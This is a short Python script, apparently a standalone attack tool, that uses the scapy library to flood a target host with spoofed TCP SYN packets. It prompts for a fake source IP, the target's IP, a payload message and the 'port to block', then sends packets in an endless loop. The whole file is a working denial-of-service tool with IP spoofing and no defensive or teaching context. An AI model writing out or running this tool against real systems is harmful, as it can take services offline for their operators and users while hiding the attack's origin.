from scapy.all import *


def syn_flood(fake_ip, target_ip, message, target_port):
    ip = IP(src=fake_ip, dst=target_ip)
    tcp = TCP(sport=4444, dport=target_port, flags="S")
    raw = Raw(load=message)
    packet = ip / tcp / raw
    send(packet, loop=1, verbose=0)


if __name__ == "__main__":
    src = input("Enter Source IP Address To Fake: ")
    target = input("Enter Target's IP Address: ")
    message = input("Enter Message FOR TCP Payload: ")
    dstPort = int(input("Enter Port to Block: "))
    while True:
        syn_flood(src, target, message, dstPort)
